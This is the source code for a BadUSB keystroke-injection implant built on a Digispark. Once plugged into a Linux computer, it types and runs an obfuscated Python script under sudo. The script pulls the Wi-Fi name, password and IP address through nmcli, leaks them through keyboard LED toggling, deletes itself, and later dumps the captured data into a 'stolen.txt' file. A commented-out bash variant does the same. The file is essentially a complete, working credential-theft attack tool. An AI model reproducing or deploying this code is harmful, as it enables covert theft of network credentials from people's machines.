#include "include/DigiKeyboard.h"
#include <EEPROM.h>
/*
const char script_content[] PROGMEM = R"=====(
#!/bin/bash
set -e
mapfile -t CAPS_LEDS < <(find /sys/class/leds -name "*::capslock")
mapfile -t SCROLL_LEDS < <(find /sys/class/leds -name "*::scrolllock")
mapfile -t NUM_LEDS < <(find /sys/class/leds -name "*::numlock")
DELAY=0.1
CURRENT_CLOCK=0
write_to_leds() {
    local bit=${1:-0}
    local leds=$2

    if ! [[ "$bit" =~ ^[0-9]+$ ]]; then return; fi
    for led in $leds; do
        if [ -w "$led/brightness" ]; then
            echo "$bit" > "$led/brightness"
        fi
    done
}
toggle_clock() {
    
    if [[ "$CURRENT_CLOCK" -eq 0 ]]; then
        CURRENT_CLOCK=1
        write_to_leds 1 "${SCROLL_LEDS[@]}"
    else
        CURRENT_CLOCK=0
        write_to_leds 0 "${SCROLL_LEDS[@]}"
    fi
    sleep $DELAY
}

set_bits() {
    local bit1=$1
    local bit2=$2
    write_to_leds "$bit1" "${CAPS_LEDS[@]}"
    write_to_leds "$bit2" "${NUM_LEDS[@]}"
    # Small delay to let voltage settle
    sleep 0.02
}
to_binary() {
    local n=$1
    local binary=""
    for (( i=7; i>=0; i-- )); do
        # Extract bit at position i using bitwise AND
        binary+="$(( (n >> i) & 1 ))"
    done
    echo "$binary"
}
save_data() {
    local data="$1"
    write_to_leds 1 "${CAPS_LEDS[@]}"
    sleep 2
    write_to_leds 0 "${CAPS_LEDS[@]}"
    sleep 0.5

    for (( i=0; i<${#data}; i++ )); do
        local char="${data:i:1}"
        local ascii=$(printf "%d" "'$char")
        local binary=$(to_binary "$ascii")
        echo "Char: $char, ASCII: $ascii, Binary: $binary"

        for (( j=0; j<8; j+=2 )); do
            local bit1=${binary:j:1}
            local bit2=${binary:j+1:1}
            if [[ -n "$bit1" && -n "$bit2" ]]; then
                set_bits "$bit1" "$bit2"
                toggle_clock
            fi
        done
    done
}
main() {
    NAME=$(nmcli -s -g NAME connection show --active | head -n 1)
    PASS=$(nmcli -s -g 802-11-wireless-security.psk connection show "$NAME")
    IP4=$(nmcli -s -g IP4.ADDRESS connection show "$NAME" | cut -d/ -f1)

    save_data "IP: $IP4, SSID: $NAME, PASS: $PASS\0"
}

main
)=====";
*/

const char python_script[] PROGMEM = R"=====(
K=range
J=Exception
G=True
E=print
A=False
import fcntl,os as F,time as C,sys as H,subprocess as I
L=19250
M=1
N=2
O=4
P=.05
Q=.1
D=None
def R():
	global D
	try:D=F.open('/dev/console',F.O_NOCTTY)
	except PermissionError:E('[-] Error: Root privileges required for ioctl.');H.exit(1)
	except J as A:E(f"[-] Error opening console: {A}");H.exit(1)
def B(caps=A,num=A,scroll=A):
	if D is None:return
	A=0
	if scroll:A|=M
	if num:A|=N
	if caps:A|=O
	try:fcntl.ioctl(D,L,A)
	except J as B:E(f"[-] IOCTL Error: {B}")
def S():
	E('[*] Syncing...')
	for D in K(3):B(caps=G);C.sleep(.2);B(caps=A);C.sleep(.2)
def T(data):
	F='1';E(f"[*] Starting Transmission: {data}");S();B(caps=A,num=A,scroll=A);C.sleep(1);D=A
	for M in data:
		H=format(ord(M),'08b')
		for I in K(0,8,2):J=H[I];L=H[I+1];B(caps=J==F,num=L==F,scroll=D);C.sleep(P);D=not D;B(caps=J==F,num=L==F,scroll=D);C.sleep(Q)
	B(caps=A,num=G,scroll=A);C.sleep(.5);B(caps=A,num=A,scroll=A);E('[*] Done.')
def U():
	try:
		B=F.environ.get('SUDO_USER');C=''
		if B:C=f"sudo -u {B} "
		D='nmcli -t -f NAME connection show --active | head -n 1';A=I.check_output(D,shell=G).decode().strip()
		if not A:return'NO_WIFI'
		E=f"{C} nmcli -s -g 802-11-wireless-security.psk connection show '{A}'";H=I.check_output(E,shell=G).decode().strip();J=f"nmcli -s -g IP4.ADDRESS connection show '{A}' | cut -d/ -f1";K=I.check_output(J,shell=G).decode().strip();return f"NAME:{A}|PASS:{H}|IP:{K}\x00"
	except:return'ERR'
def V():
	if D:F.close(D)
	try:F.remove(H.argv[0])
	except:pass
if __name__=='__main__':
	R()
	try:W=U();T(W)
	finally:V()
)=====";

#define NUM_LOCK 1
#define CAPS_LOCK 2
#define SCROLL_LOCK 4

int eepromAddr = 0;
byte lastScrollState = 0;
int bitIndex = 0;
byte currentByte = 0;
bool scriptInjected = false;
bool transmissionEnded = false;
bool transmissionStarted = false;

// void inject_script();
void inject_python();
void read_EEPROM();

void setup()
{
  DigiKeyboard.delay(2000);
  pinMode(1, OUTPUT);
  // digitalWrite(1, HIGH);
  // digitalWrite(1, LOW);
  DigiKeyboard.update();
  if (DigiKeyboard.getLEDs() & CAPS_LOCK)
  {
    transmissionEnded = true;
    read_EEPROM();
  }
  else
  {
    digitalWrite(1, HIGH);
    delay(200);
    digitalWrite(1, LOW);
    delay(200);
    digitalWrite(1, HIGH);
    delay(200);
    digitalWrite(1, LOW);
  }
}

void loop()
{
  DigiKeyboard.update();
  byte leds = DigiKeyboard.getLEDs();
  if (transmissionEnded)
    {
      while (1)
      {
        digitalWrite(1, HIGH);
        delay(100);
        digitalWrite(1, LOW);
        delay(100);
      }
      
    }
  if (!scriptInjected)
  {
    digitalWrite(1, HIGH);
    DigiKeyboard.delay(1000);
    digitalWrite(1, LOW);
    inject_python();
  }
  if (!transmissionStarted)
  {
    if (leds & CAPS_LOCK)
    {
      transmissionStarted = true;
      digitalWrite(1, HIGH);
      delay(100);
      digitalWrite(1, LOW);

      while (DigiKeyboard.getLEDs() & CAPS_LOCK)
      {
        DigiKeyboard.update();
        delay(10);
      }
    }
    return;
  }
  else
  {

    bool currentScrollState = (leds & SCROLL_LOCK);
    bool currentCapsState = (leds & CAPS_LOCK);
    bool currentNumState = (leds & NUM_LOCK);

    if (currentScrollState != lastScrollState)
    {
      lastScrollState = currentScrollState;

      if (currentCapsState)
      {
        currentByte |= (1 << (7 - bitIndex));
      }
      bitIndex++;
      if (currentNumState)
      {
        currentByte |= (1 << (7 - bitIndex));
      }
      bitIndex++;

      // Save the byte to EEPROM when we have 8 bits
      if (bitIndex == 8)
      {

        // EOT (End of Transmission)
        if (currentByte == 0)
        {
          transmissionEnded = true;

          for (int k = 0; k < 10; k++)
          {
            digitalWrite(1, HIGH);
            delay(50);
            digitalWrite(1, LOW);
            delay(50);
          }
          digitalWrite(1, HIGH);
        }
        else
        {
          if (eepromAddr < 512)
          {
            EEPROM.update(eepromAddr, currentByte);
            eepromAddr++;
          }
        }

        bitIndex = 0;
        currentByte = 0;

        digitalWrite(1, HIGH);
        DigiKeyboard.delay(10);
        digitalWrite(1, LOW);
      }
    }
  }
}
/*
void inject_script()
{
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);

  while (DigiKeyboard.getLEDs() & CAPS_LOCK)
  {
    DigiKeyboard.sendKeyStroke(KEY_CAPS_LOCK);
    DigiKeyboard.delay(100);
    DigiKeyboard.update();
  }

  DigiKeyboard.print("cat << 'EOF' > /tmp/pwn.sh");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  int len = strlen_P(script_content);
  for (int k = 0; k < len; k++)
  {
    char c = pgm_read_byte_near(script_content + k);
    DigiKeyboard.print(c);
    DigiKeyboard.delay(2);
  }

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("EOF");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.print("chmod +x /tmp/pwn.sh");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.print("sudo /tmp/pwn.sh");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  scriptInjected = true;
  for (int i = 0; i < 3; i++)
  {
    digitalWrite(1, HIGH);
    delay(100);
    digitalWrite(1, LOW);
    delay(100);
  }
}
*/

void inject_python() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);

  DigiKeyboard.print("cat << 'EOF' > /tmp/p.py");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  int len = strlen_P(python_script);
  for (int k = 0; k < len; k++)
  {
    char c = pgm_read_byte_near(python_script + k);
    DigiKeyboard.print(c);
    DigiKeyboard.delay(1);
  }

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("EOF");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.print("sudo python3 /tmp/p.py & disown && exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  scriptInjected = true;
  for (int i = 0; i < 3; i++)
  {
    digitalWrite(1, HIGH);
    delay(100);
    digitalWrite(1, LOW);
    delay(100);
  }

}


void read_EEPROM()
{
  while (DigiKeyboard.getLEDs() & CAPS_LOCK)
  {
    DigiKeyboard.sendKeyStroke(KEY_CAPS_LOCK);
    DigiKeyboard.delay(100);
    DigiKeyboard.update();
  }
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("cat << 'EOF' > ~/stolen.txt");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("Stolen Data:");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("============");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (int i = 0; i < 512; i++)
  {
    byte charCode = EEPROM.read(i);
    if (charCode == 0)
      break;
    DigiKeyboard.write(charCode);
    DigiKeyboard.delay(5);
  }
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("EOF");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
